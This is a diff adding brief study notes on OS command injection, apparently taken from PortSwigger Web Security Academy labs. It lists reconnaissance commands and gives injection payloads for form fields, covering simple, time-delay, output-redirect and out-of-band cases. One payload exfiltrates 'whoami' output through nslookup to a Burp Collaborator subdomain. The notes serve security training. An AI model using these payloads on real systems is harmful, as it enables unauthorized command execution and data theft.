@@ -1,0 +1,30 @@
+OS command injection
+
+https://portswigger.net/web-security/os-command-injection
+
+
+
+
+Purpose of command 	    Linux       	Windows
+Name of current user 	whoami      	whoami
+Operating system    	uname -a    	ver
+Network configuration 	ifconfig    	ipconfig /all
+Network connections 	netstat -an 	netstat -an
+Running processes    	ps -ef 	        tasklist 
+
+
+Executing arbitrary commands
+	OS command injection, simple case
+		POST : productId=6&storeId=2|whoami
+Blind OS command injection vulnerabilities
+	Blind OS command injection with time delays
+		POST : email=asd@asd || ping -c 10 127.0.0.1 ||
+	blind OS command injection by redirecting output
+		POST : email=asd@asd || whoami > /var/www/images/whoami.txt ||
+Blind OS command injection using out-of-band (OAST) techniques
+	Blind OS command injection with out-of-band interaction
+		Burp Collaborator : email=x||nslookup x.burpcollaborator.net||
+	Blind OS command injection with out-of-band data exfiltration
+		Burp Collaborator : email=x||nslookup `whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net||
+		
+
